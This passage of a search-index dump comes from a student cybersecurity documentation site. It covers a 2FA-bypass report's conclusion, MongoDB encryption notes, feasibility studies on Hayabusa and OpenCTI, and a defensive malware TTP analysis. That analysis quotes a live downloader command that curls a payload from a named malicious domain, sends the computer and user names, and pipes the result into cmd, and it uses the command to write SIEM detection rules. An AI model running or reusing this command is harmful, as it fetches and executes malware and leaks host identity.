Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#conclusion","content":" To conclude this report we have discussed the different ways the attackers can bypass the two-factor authentication to gain unauthorized access to the user account. The attackers can use Evilginx2, pass the cookie hijack, SIM-based man-in-the-middle attack, and brute force attack. The document covers each attack and how it can be a risk to the company and user data. I have discussed how the cyber security team and defend against these attacks. The document helps train the users and the cyber security team to understand the potential attacks. furthermore, it helps the cyber security team to come up with solutions and ways to prevent data breaches against these attacks.  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#references","content":" https://m0chan.github.io/2019/07/26/Bypassing-2FA-For-Fun-With-Evilginx2.html  https://breakdev.org/evilginx-advanced-phishing-with-two-factor-authentication-bypass/  https://medium.com/@OWN_team/analysis-and-detection-of-mitm-phishing-attacks-bypassing-2fa-o365-use-case-cf0ffdae9cae  https://blog.netwrix.com/2022/11/29/bypassing-mfa-with-pass-the-cookie-attack/ ","version":"Next","tagName":"h2"},{"title":"Additional Research Pieces","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/additional-pieces","content":"Last updated by: Kaleb, Last updated on: '15/05/2024' Last updated by: Kaleb, Last updated on: '15/05/2024' Additional Research Pieces For those that are a bit too long, or pending conversion Web Application SecurityGCP Infrastructure SecurityIoT Security","keywords":"","version":"Next"},{"title":"Security Best Practices Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/CI-CD_Dhairya/best-practices","content":"Security Best Practices Guide PDF Guide","keywords":"","version":"Next"},{"title":"Authenticate features and encryption","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/authenticate-features","content":"","keywords":"","version":"Next"},{"title":"Flow chart for mongoDb​","type":1,"pageTitle":"Authenticate features and encryption","url":"/redback-documentation/docs/cybersecurity/research/authenticate-features#flow-chart-for-mongodb","content":"   ","version":"Next","tagName":"h2"},{"title":"TLS encryption:​","type":1,"pageTitle":"Authenticate features and encryption","url":"/redback-documentation/docs/cybersecurity/research/authenticate-features#tls-encryption","content":" By creating a set of certificates for the servers, MongoDB Atlas performs encryption in transit from application client to server and throughout intra-cluster interactions. Once TLS enabled clients pass access and authentication controls, MongoDB Atlas uses Let's Encrypt verified certificates to authenticate them.  ","version":"Next","tagName":"h2"},{"title":"Encryption at rest:​","type":1,"pageTitle":"Authenticate features and encryption","url":"/redback-documentation/docs/cybersecurity/research/authenticate-features#encryption-at-rest","content":" MongoDB encryption at rest is an Enterprise feature that requires the MongoDB Atlas Enterprise binaries. Encryption at rest is a security layer that ensures that written data or storage are only visible once decrypted by a trusted process or application. Every node in your MongoDB Atlas cluster comes with built-in encryption at rest for discs. However, the Wired Tiger storage engine can also enable Encryption at Rest.  The WiredTiger storage engine enables the encryption of server data files (collections and indexes) as they are written to disc. This protects your server from a variety of threats. They will not be able to open your data files or backups with another mongod binary to access the data since they do not have the protected certificate key that encrypted the data. At the Operating System level, no other software installed on the server may open the files or intercept the data. Unlike direct disc encryption, which allows the operating system to read the encrypted database. Briefly, only the MongoDB Server has access to an AES-256 master key, which should be kept in a secure location.  ","version":"Next","tagName":"h2"},{"title":"Client-side encryption:​","type":1,"pageTitle":"Authenticate features and encryption","url":"/redback-documentation/docs/cybersecurity/research/authenticate-features#client-side-encryption","content":" A feature called MongoDB Client-Side Field Level Encryption was introduced with MongoDB version 4.2. This new framework enables MongoDB Clients like drivers and shell to encrypt and decode fields locally using secure keys stored in a secure repository (KMS). This adds an additional degree of protection by ensuring that sensitive data is never sent over the wire or to database clients who lack the necessary key to decrypt the data. This capability is available to any Atlas cluster running version 4.2 or higher. Field Level Encryption can be done manually or automatically, and we can store our keys with any one or more of the following providers:  Amazon web serviceAzure key vaultGoogle cloud platform  ","version":"Next","tagName":"h2"},{"title":"Rotation of encryption keys:​","type":1,"pageTitle":"Authenticate features and encryption","url":"/redback-documentation/docs/cybersecurity/research/authenticate-features#rotation-of-encryption-keys","content":" A regular key rotation is one of the best practices for handling encryption keys. Because there is a potential that our keys will be compromised at some point, this is a significant consideration for database managers. As a result, rotating them will allow us to prevent the possibility of a compromised key. Built-in guidelines to rotate the appropriate keys depending on the exact provider you're using for MongoDB Atlas encryption at rest and Client-Side Field Level encryption.  ","version":"Next","tagName":"h2"},{"title":"Authentication in Mongo DB:​","type":1,"pageTitle":"Authenticate features and encryption","url":"/redback-documentation/docs/cybersecurity/research/authenticate-features#authentication-in-mongo-db","content":" The default behavior is without authentication so you will have to connect to the server using the mongo shell, then there you create a user admin, from there you create mongod configuration file to enable authenticate feature. Then connect to server and authenticate as the user admin and then after doing that you can finally create additional users as per need. A link to a tutorial is given below.  How to Enable Authentication on MongoDB | by Stampery Inc. | Mongoaudit — the mongoaudit guides | Medium  ","version":"Next","tagName":"h2"},{"title":"Summary:​","type":1,"pageTitle":"Authenticate features and encryption","url":"/redback-documentation/docs/cybersecurity/research/authenticate-features#summary","content":" MongoDB is a general-purpose corporate database with numerous levels of industry-standard encryption to meet your individual data security requirements. MongoDB Atlas makes it much easier to use and deploy those data security capabilities because they're built-in and ready to use in minutes or less. Through the research report we gathered the encryption and authentication for user accounts and data security.  TLS encryptionEncryption at restClient-rest encryptionRotation of encryption keys  Each method is discussed in the report to showcase key features, recommendations or limitations for the final decision. The report concludes with the flowchart of all the encryption methods for th field data. Moreover, demonstrates the procedures to enable authentication and encryption of all the user data and company data. ","version":"Next","tagName":"h2"},{"title":"On Prem CI CD","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/CI-CD_Dhairya/on-prem","content":"On Prem CI CD PDF Guide","keywords":"","version":"Next"},{"title":"Troubleshooting Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/CI-CD_Dhairya/troubleshoot","content":"Troubleshooting Guide PDF Guide","keywords":"","version":"Next"},{"title":"Setting up CD CI","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/CI-CD_Dhairya/setting-up","content":"Setting up CD CI PDF Guide","keywords":"","version":"Next"},{"title":"Efficient and Effective Way of Analyzing TTPs of Malware","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/Efficient and Effective Way of Analyzing TTPs of Malware","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Efficient and Effective Way of Analyzing TTPs of Malware","url":"/redback-documentation/docs/cybersecurity/research/Efficient and Effective Way of Analyzing TTPs of Malware#introduction","content":" In today's evolving cybersecurity landscape, analyzing malware and understanding its Tactics, Techniques, and Procedures (TTPs) is crucial to building effective defenses. This demonstration uses Malware Bazaar and VirusTotal to efficiently analyze malware samples, identify malicious behaviors, and extract key signatures.  Malware Bazaar is a vast repository of malware samples, contributed by the security community, researchers, and organizations. This analysis will use samples of RAT and Stealer Malware to uncover the methods and patterns they commonly employ, such as task scheduling, dropping executables in startup folders, and leveraging PowerShell scripts for executing commands or deploying shell scripts.  The analysis of these samples will take place on VirusTotal. On this well-established platform, files and URLs are scanned using various antivirus engines and behavioral analysis tools. VirusTotal will be useful in analyzing the malware samples obtained from Malware Bazaar, helping to highlight the techniques they employ and aiding in identifying key signatures that can be used to detect and mitigate threats by creating rules that will be integrated into SIEM solutions. By combining these tools, this demonstration aims to showcase a practical approach to efficiently recognizing critical malware behaviors for improved detection and response capabilities.  ","version":"Next","tagName":"h2"},{"title":"Goals and Objectives​","type":1,"pageTitle":"Efficient and Effective Way of Analyzing TTPs of Malware","url":"/redback-documentation/docs/cybersecurity/research/Efficient and Effective Way of Analyzing TTPs of Malware#goals-and-objectives","content":" The main goal of this demonstration and documentation is to showcase an efficient method of analyzing TTPs of various malware samples attained from Malware Bazaar using VirusTotal. Additionally, this analysis aims to help my team improve the detection capabilities of the SIEM solution by identifying important signatures that can be used to create rules.  Initially, the TTPs of some malware samples used by APT Bitter (as shown in Figure 1) will be utilized to identify important patterns. I began with the analysis of SHA256 1cafe3979fbd529129440e058b8ed8e0d4e283325dee448816d3aa354f7c412a, which is attributed as Trojan-Downloader because it downloads other stage malware such as RAT and Info-Stealer Malware.  Also, it can be seen in Figure 3 that the malware is using the following command “ ['--headless cmd /c &quot;curl -o C:\\users\\public\\Music\\cdr.tr colorsofnether.com/bgte.php?hy=%computername%BBB%username% &amp; more C:\\users\\public\\Music\\cdr.tr|cmd&quot;']” to connect and download another malwar.Such patterns are used by malicious actors to secretly download and execute RAT and info-stealer malware, as these malwares can be easily detected if used directly.  Hence, a rule can be created to generate an alert upon any process that involves: Command Prompt &amp;&amp; Curl Statement &amp;&amp; .php? string Similarly, C:\\\\users\\\\public\\\\Music\\\\ is the directory where the malware is dropped. Therefore, a rule can be created to generate an alert if files with extensions .exe, .zip, .py, .ps1, .psm1, .lnk, and .vbs are dropped or used in the C:\\\\users\\\\public\\\\Music\\\\ directory.      ","version":"Next","tagName":"h2"},{"title":"Analysis of Next Malware​","type":1,"pageTitle":"Efficient and Effective Way of Analyzing TTPs of Malware","url":"/redback-documentation/docs/cybersecurity/research/Efficient and Effective Way of Analyzing TTPs of Malware#analysis-of-next-malware","content":" The next malware that was analyzed is a RAT malware with info-stealing capabilities having the SHA256 hash: dcdae583da8a1b01a8ad0caef6a7f6f3b6f1eb6dd3298ac7d904200f52712446 This malware was downloaded using the 1st stage malware as described previously. Some of the URLs that were used by the malware are shown in Figure 4, and the highlighted domain should be blocked in the Firewall.    ","version":"Next","tagName":"h2"},{"title":"Important Signature Identification​","type":1,"pageTitle":"Efficient and Effective Way of Analyzing TTPs of Malware","url":"/redback-documentation/docs/cybersecurity/research/Efficient and Effective Way of Analyzing TTPs of Malware#important-signature-identification","content":" One important signature identified in this analysis is the usage of the Command Prompt for the execution of the malware, as shown in Figure 6. Thus, a rule can be created that should alert if the command prompt executes any executable file.  While there may be some false alerts over time, the detection can be improved by optimizing the rules for better accuracy. This can include adding detections for any modifications in directories that malware typically alters to drop or delete files, along with changes in the Registry.    ","version":"Next","tagName":"h2"},{"title":"Additional APT Bitter Malware Analysis​","type":1,"pageTitle":"Efficient and Effective Way of Analyzing TTPs of Malware","url":"/redback-documentation/docs/cybersecurity/research/Efficient and Effective Way of Analyzing TTPs of Malware#additional-apt-bitter-malware-analysis","content":" Some other APT Bitter malwares analyzed in this activity revealed more useful patterns, as shown in Figures 7 and 8. These patterns include:  Scheduling tasksUsing hh.exe to open .chm filesUtilizing msiexec to execute .msi files  Therefore, similar rules can be created and integrated into the SIEM while testing them, to identify such malwares that are otherwise not easily detected by Anti-Malware Software.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Efficient and Effective Way of Analyzing TTPs of Malware","url":"/redback-documentation/docs/cybersecurity/research/Efficient and Effective Way of Analyzing TTPs of Malware#conclusion","content":" This demonstration provides a practical way of using VirusTotal and Malware Bazaar to efficiently analyze various malware samples to identify important signatures as outlined in this document. This method can be applied to more malware; however, we utilized only a few APT Bitter malware samples to showcase the method. The document clearly demonstrates the usability of VirusTotal in analyzing TTPs of different malware.  Overall, the blue team can use this method to analyze TTPs of many malwares in less time, allowing for the creation of various rules and optimizations for detection in SIEM Solutions.  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Efficient and Effective Way of Analyzing TTPs of Malware","url":"/redback-documentation/docs/cybersecurity/research/Efficient and Effective Way of Analyzing TTPs of Malware#references","content":" Malware Bazaar - APT Bitter SignaturesVirusTotal ","version":"Next","tagName":"h2"},{"title":"Feasibility Study of Integrating Hayabusa into Redback Operations' Cybersecurity Framework","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study On Hayabusa","content":"","keywords":"","version":"Next"},{"title":"1. Objectives​","type":1,"pageTitle":"Feasibility Study of Integrating Hayabusa into Redback Operations' Cybersecurity Framework","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study On Hayabusa#1-objectives","content":" The primary objective of this study is to evaluate the feasibility of integrating Hayabusa, a Windows forensic tool, into Redback Operations' cybersecurity ecosystem, specifically with the existing Wazuh platform. The study explores how Hayabusa can complement Redback’s current tools—such as Wazuh, Suricata, Nagios, and VirusTotal—and provide forensic capabilities that are currently lacking in Redback's infrastructure.  As Redback Operations manages various projects, such as VR Sun Cycle Smart Bike, Elderly Wearable Technology, Athlete Wearable Technology, Player Tracking, and BugBox, securing sensitive project data is critical. The Cybersecurity Team, tasked with defending these projects, can leverage Hayabusa’s forensic abilities to enhance incident response, particularly in post-incident investigation and root cause analysis.  ","version":"Next","tagName":"h2"},{"title":"2. Current Infrastructure Overview​","type":1,"pageTitle":"Feasibility Study of Integrating Hayabusa into Redback Operations' Cybersecurity Framework","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study On Hayabusa#2-current-infrastructure-overview","content":" Redback Operations uses a cloud and virtualized infrastructure supported by various cybersecurity tools to monitor, defend, and respond to security incidents across different projects. The Cybersecurity Team operates within a structured environment, utilizing:  Wazuh as the primary SIEM for log management and real-time threat detection.Suricata for network intrusion detection.Nagios for monitoring system health and server performance.VirusTotal integrated with Wazuh to scan files and logs for malware.  Each project, from Project 1: VR Sun Cycle Smart Bike to Project 5: BugBox, has unique data collection, storage, and processing needs, ranging from IoT data streams to real-time player tracking systems. Given the scope and variety of these projects, the Cybersecurity Team often handles large volumes of logs, particularly from Windows-based systems. While Wazuh and Suricata do an excellent job of identifying threats in real-time, forensic analysis to determine how an attack unfolded or how a breach occurred is limited without a dedicated tool like Hayabusa.  ","version":"Next","tagName":"h2"},{"title":"3. Technical Feasibility: Integrating Hayabusa with Wazuh​","type":1,"pageTitle":"Feasibility Study of Integrating Hayabusa into Redback Operations' Cybersecurity Framework","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study On Hayabusa#3-technical-feasibility-integrating-hayabusa-with-wazuh","content":" Integrating Hayabusa with Wazuh is both technically feasible and strategic. The two tools complement each other: while Wazuh provides comprehensive log management and real-time alerts, Hayabusa dives deeper into Windows Event Logs, which are vital for incident response and forensic investigations.  Integration Points:  Forensic Analysis: Wazuh can trigger Hayabusa to analyze specific Windows Event Logs when an alert is raised. This gives the Cybersecurity Team detailed insights into system behavior and potential misconfigurations that could have led to an incident.Automated Workflows: Hayabusa can be integrated into Wazuh’s automated workflows. For instance, when Wazuh detects an anomaly on a Windows system, Hayabusa can be deployed to conduct deeper analysis without human intervention.Unified Dashboard: Data from Hayabusa can be visualized in the Wazuh dashboard, allowing analysts to view both real-time events and detailed forensic logs in one place.Threat-Hunting: Hayabusa provides critical forensic data that can be analyzed over time, feeding into threat-hunting strategies, and helping to identify patterns that may otherwise go unnoticed by Wazuh.  The integration does not require overhauling the existing infrastructure and can be implemented by configuring Wazuh to support custom log analysis scripts. Moreover, since the Cybersecurity Team is already proficient with Wazuh, adding Hayabusa would require minimal additional training.  ","version":"Next","tagName":"h2"},{"title":"4. Benefits of Adding Hayabusa​","type":1,"pageTitle":"Feasibility Study of Integrating Hayabusa into Redback Operations' Cybersecurity Framework","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study On Hayabusa#4-benefits-of-adding-hayabusa","content":" Integrating Hayabusa into Redback’s cybersecurity ecosystem will provide significant benefits, particularly for the Cybersecurity Team in terms of forensic analysis and post-incident investigation.  Key Benefits:  Enhanced Forensic Capabilities: Hayabusa will enable the team to conduct in-depth investigations into security incidents by analyzing Windows Event Logs that go beyond what is currently visible through Wazuh’s real-time alerts. This will help identify the root causes of incidents, especially for projects like BugBox, where user session data might be targeted.Improved Incident Response: The Cybersecurity Team can react more effectively to threats by analyzing logs from compromised systems. For example, in Project 2: Elderly Wearable Technology, any anomaly in IoT device data transmission can be investigated for hidden attacks that evade real-time detection.Integration with Wazuh for Streamlined Workflows: Hayabusa’s outputs can be integrated into Wazuh's alerting mechanisms, ensuring that real-time security events and post-incident forensic data are accessible from a single pane of glass. This enhances the efficiency of incident response workflows.Long-Term Threat-Hunting: By adding Hayabusa to the threat-hunting toolkit, the Cybersecurity Team can leverage forensic data to track advanced persistent threats (APTs) and study the attack patterns across projects. This is critical for projects like Athlete Wearable Technology , where personal and performance data must be protected.Alignment with Compliance Requirements: For projects dealing with sensitive data, such as Elderly Wearable Technology (Project 2) and Player Tracking (Project 4), Hayabusa’s forensic capabilities will strengthen compliance with data protection standards, including GDPR and NIST 800-53.  ","version":"Next","tagName":"h2"},{"title":"5. Risks and Challenges​","type":1,"pageTitle":"Feasibility Study of Integrating Hayabusa into Redback Operations' Cybersecurity Framework","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study On Hayabusa#5-risks-and-challenges","content":" Despite the potential benefits, there are several risks and challenges associated with the integration of Hayabusa.  Performance Impact: Running forensic-level analysis on large volumes of Windows Event Logs can introduce latency, particularly in high-traffic environments such as the Player Tracking project. The team must carefully balance the depth of forensic analysis with system performance.Data Storage and Management: With the increased logging from Hayabusa, there will be a significant growth in the volume of forensic logs that need to be stored and managed. The Cybersecurity Team will need to assess whether Redback's current data storage infrastructure can handle this additional load.Training Needs: While Hayabusa is intuitive, the Cybersecurity Team will need to undergo training to ensure that they are able to effectively utilize its advanced forensic features. This could initially slow down operations as the team adapts to new workflows.False Positives: Misconfigurations in log analysis or thresholds can increase the number of false positives generated by Hayabusa. This can be mitigated through careful tuning and by leveraging Wazuh’s real-time event correlation to focus forensic efforts on true threats.  ","version":"Next","tagName":"h2"},{"title":"6. Alternative Solutions​","type":1,"pageTitle":"Feasibility Study of Integrating Hayabusa into Redback Operations' Cybersecurity Framework","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study On Hayabusa#6-alternative-solutions","content":" If integrating Hayabusa presents significant challenges, alternative solutions should be considered:  Velociraptor: An open-source alternative with a focus on endpoint monitoring and digital forensics. It provides similar benefits to Hayabusa but with a lighter footprint.GRR Rapid Response: A Google-developed tool optimized for large-scale forensic analysis, particularly useful if Redback’s project data volumes increase in the future.Enhanced Wazuh Usage: Wazuh’s native forensic capabilities could be further exploited, though it would not provide the deep, detailed forensic analysis that a dedicated tool like Hayabusa or Velociraptor could offer.  ","version":"Next","tagName":"h2"},{"title":"7. Conclusion​","type":1,"pageTitle":"Feasibility Study of Integrating Hayabusa into Redback Operations' Cybersecurity Framework","url":"/redback-documentation/docs/cybersecurity/research/Feasibility Study On Hayabusa#7-conclusion","content":" The integration of Hayabusa into Redback Operations’ cybersecurity framework presents a significant opportunity to enhance forensic capabilities, particularly for projects that generate large volumes of data or have sensitive user information. Wazuh will continue to serve as the core SIEM tool, while Hayabusa will provide post-incident forensic analysis, ensuring a well-rounded security posture.  For Redback’s Cybersecurity Team, having Hayabusa integrated into Wazuh’s workflows will streamline the investigation of Windows-based systems, provide better insights into system compromises, and aid in identifying long-term threats across projects such as Athlete Wearable Technology and BugBox. While there are some risks, such as performance impacts and increased data storage needs, these can be managed with proper planning and configuration.  Overall, integrating Hayabusa into the cybersecurity infrastructure is a feasible and beneficial step toward strengthening the company's ability to respond to and investigate security incidents, ensuring the integrity and security of Redback Operations' projects.  Appendix: Playbook Maintenance and Review The integration of Hayabusa into Wazuh should be reviewed bi-annually. This review will ensure that all configurations are optimized, and that the tool remains aligned with Redback’s growing infrastructure. Training should also be updated annually, ensuring all Cybersecurity Team members can leverage Hayabusa effectively in incident response and forensic workflows. ","version":"Next","tagName":"h2"},{"title":"Feasibility Study on Implementing OpenCTI","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI","content":"","keywords":"","version":"Next"},{"title":"INTRODUCTION​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"Purpose of the Study​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#purpose-of-the-study","content":" The purpose of this feasibility study is to evaluate the potential benefits and challenges of implementing OpenCTI within Redback Operations. OpenCTI, an open-source threat intelligence platform, offers capabilities that could enhance the cybersecurity posture of the organization. This study will explore how OpenCTI can be integrated into the existing infrastructure, particularly to support the various cybersecurity teams—SecDevOps, GRC, Blue Team, Red Team, and Infrastructure Team—who are engaged in both defensive and offensive operations.  ","version":"Next","tagName":"h3"},{"title":"Background Information on OpenCTI​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#background-information-on-opencti","content":" OpenCTI is designed to collect, organize, and visualize cyber threat information from multiple sources, providing a unified platform for managing and analyzing threat intelligence. It supports various formats, including STIX/TAXII, and offers API integration capabilities, making it a flexible tool for threat intelligence sharing and collaboration. Given Redback Operations’ emphasis on cybersecurity, including monitoring and incident response activities, OpenCTI’s features could significantly enhance the team’s ability to detect and respond to threats.  ","version":"Next","tagName":"h3"},{"title":"OBJECTIVES​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#objectives","content":" ","version":"Next","tagName":"h2"},{"title":"Primary Goal​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#primary-goal","content":" To determine whether OpenCTI can effectively support and enhance the threat intelligence capabilities of Redback Operations, aligning with the specific needs of ongoing projects and cybersecurity initiatives.  ","version":"Next","tagName":"h3"},{"title":"Specific Objectives​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#specific-objectives","content":" Enhance Threat Visibility: Improve the organization’s ability to detect and understand emerging cyber threats by consolidating threat data in a centralized platform.Improve Incident Response: Facilitate faster and more informed decision-making during incidents through real-time access to relevant threat intelligence.Support Collaboration: Enable seamless collaboration among different cybersecurity teams by providing a shared platform for threat data.Align with Organizational Growth: Ensure that OpenCTI can scale with Redback Operations as it takes on new projects and handles increasing volumes of threat data.  ","version":"Next","tagName":"h3"},{"title":"FUNCTIONAL ANALYSIS​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#functional-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"Overview of OpenCTI’s Features​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#overview-of-openctis-features","content":" Data Aggregation: OpenCTI aggregates threat intelligence from multiple sources, including internal logs, external threat feeds, and manual inputs, into a unified database.Threat Visualization: The platform offers powerful visualization tools, including graphs and dashboards, to help users understand the relationships between different threats.Automated Sharing: OpenCTI can automate the sharing of threat intelligence across teams and systems, ensuring that all relevant parties have access to the latest information.Integration with Existing Tools: OpenCTI supports integration with other cybersecurity tools, such as SIEMs, through its API, allowing for automated data flow and response.  ","version":"Next","tagName":"h3"},{"title":"Comparison with Organizational Requirements​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#comparison-with-organizational-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"Cybersecurity Team Needs:​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#cybersecurity-team-needs","content":" Blue Team: Focused on defensive operations using tools like SIEM, Nagios, and Wazuh, OpenCTI could provide enhanced threat intelligence that integrates directly into these tools.Red Team: Engaged in penetration testing and vulnerability assessments, the Red Team could benefit from the latest threat intelligence to simulate real-world attack scenarios.SecDevOps: Tasked with integrating and deploying security tools, the SecDevOps team could use OpenCTI to ensure that deployed systems are aligned with the latest threat landscapes.  ","version":"Next","tagName":"h3"},{"title":"Project-Specific Needs:​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#project-specific-needs","content":" VR SunCycle and Wearable Technology Projects: These projects may involve collecting and processing sensitive data, making them potential targets for cyber threats. OpenCTI can help in identifying and mitigating such risks by providing relevant threat intelligence.  ","version":"Next","tagName":"h3"},{"title":"Key Features Aligned with Organizational Needs​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#key-features-aligned-with-organizational-needs","content":" API Integration: Essential for integrating OpenCTI with existing tools used by various teams.Real-Time Threat Sharing: Supports faster incident response, which is critical for both offensive and defensive cybersecurity teams.Scalability: Important to ensure that OpenCTI can grow alongside Redback Operations as it expands its project portfolio and cyber operations.  ","version":"Next","tagName":"h3"},{"title":"TECHNICAL ASSESSMENT​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#technical-assessment","content":" ","version":"Next","tagName":"h2"},{"title":"System Requirements​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#system-requirements","content":" Existing Infrastructure: Redback Operations currently relies on virtual machines (VMs) provided through Deakin University’s VPN and other remote resources. Therefore, the implementation of OpenCTI will need to leverage this existing infrastructure rather than deploying on traditional on-premises servers or cloud platforms.Software Dependencies: OpenCTI operates on Linux distributions and requires additional software such as PostgreSQL, Elasticsearch, and Redis. The technical team must assess whether these can be accommodated within the existing VM infrastructure.University’s VPNcture: The network infrastructure, particularly the use of Deakin University’s VPN, will need to support the secure and efficient operation of OpenCTI. This includes ensuring that data transfer between VMs and other integrated tools (like SIEM, Wazuh, and Nagios) is secure and dependable.  ","version":"Next","tagName":"h3"},{"title":"Compatibility​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#compatibility","content":" Existing Systems: OpenCTI must be compatible with the tools and systems currently in use within Redback Operations, which are primarily accessed through VMs. This includes ensuring that the VMs have the necessary resources and configurations to support the platform.Protocols: OpenCTI’s support for industry-standard protocols such as STIX/TAXII is crucial for its integration with Redback’s existing tools and external threat intelligence feeds.  ","version":"Next","tagName":"h3"},{"title":"Scalability​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#scalability","content":" Infrastructure Constraints: Given the reliance on VMs and the university’s infrastructure, scalability will depend on the available resources within this environment. The feasibility of expanding the infrastructure (e.g., increasing the number of VMs or their resources) must be assessed.Organizational Growth: As Redback Operations grows and potentially takes on more complex cybersecurity projects, the infrastructure supporting OpenCTI must be flexible enough to scale accordingly. This could involve negotiating additional resources from the university or optimizing the use of existing VMs.  ","version":"Next","tagName":"h3"},{"title":"Deployment Considerations​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#deployment-considerations","content":" Leveraging Existing VMs: Rather than deploying on new on-premises or cloud infrastructure, OpenCTI can be deployed within the existing VM environment provided by Deakin University. This approach minimizes additional costs and complexity.Technical Challenges: Potential challenges include ensuring that VMs have sufficient resources to handle OpenCTI’s requirements, managing data security across VMs, and maintaining performance within the constraints of the university-provided infrastructure.  ","version":"Next","tagName":"h3"},{"title":"Maintenance and Support​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#maintenance-and-support","content":" Ongoing Maintenance: Maintenance will involve managing OpenCTI within the VM environment, ensuring that software dependencies are kept up-to-date, and that performance remains optimal. The IT support team must be familiar with the VM environment and how to maintain OpenCTI within it.Technical Support: Given the open-source nature of OpenCTI, community support will be valuable, but in-house expertise will also be crucial for handling day-to-day operations and troubleshooting within the VM environment.  ","version":"Next","tagName":"h3"},{"title":"SECURITY AND COMPLIANCE​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#security-and-compliance","content":" Security Features: The security assessment will need to consider the protections provided by the university's VM environment and VPN. Focus on how OpenCTI's security features, such as encryption and access controls, can integrate with or enhance the existing security measures provided by the VMs.Compliance: Compliance considerations will be based on how OpenCTI operates within the VM environment. Ensure that the VM infrastructure meets relevant compliance standards (e.g., data residency, access control) and that OpenCTI’s deployment will not introduce compliance risks.Data Privacy: Since the VMs and VPN are provided by Deakin University, data privacy measures must align with the university's policies. Assess how OpenCTI can maintain privacy and confidentiality within this shared infrastructure.  ","version":"Next","tagName":"h3"},{"title":"INTEGRATION POTENTIAL​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#integration-potential","content":" Compatibility with Existing Tools: The integration of OpenCTI with tools like SIEM, Wazuh, and Nagios will need to be tested within the existing VM environment. Focus on how data flows between these tools within the VMs and whether any performance or security issues arise.API Capabilities: The API integration will need to work within the constraints of the VM environment, including any limitations imposed by the university's network setup. Consider the feasibility of API calls across VMs and through the VPN.Interoperability: Ensure that OpenCTI’s interoperability with other tools is fully functional within the VM environment, considering any potential restrictions or performance impacts imposed by the university’s infrastructure.  ","version":"Next","tagName":"h3"},{"title":"USER EXPERIENCE AND TRAINING​","type":1,"pageTitle":"Feasibility Study on Implementing OpenCTI","url":"/redback-documentation/docs/cybersecurity/research/feasibility study on OpenCTI#user-experience-and-training","content":" Usability: Training programs should focus on how users can effectively operate OpenCTI within the VM environment. This includes managing the application within VMs and understanding any specific requirements related to the university’s infrastructure.Training Requirements: The training must cover not only OpenCTI’s functionalities but also the specifics of using it within the VM environment. This might include how to access OpenCTI via the VPN, manage resources within VMs, and troubleshoot common issues in this setup.Onboarding: Onboarding will need to include instructions on accessing and managing OpenCTI through the 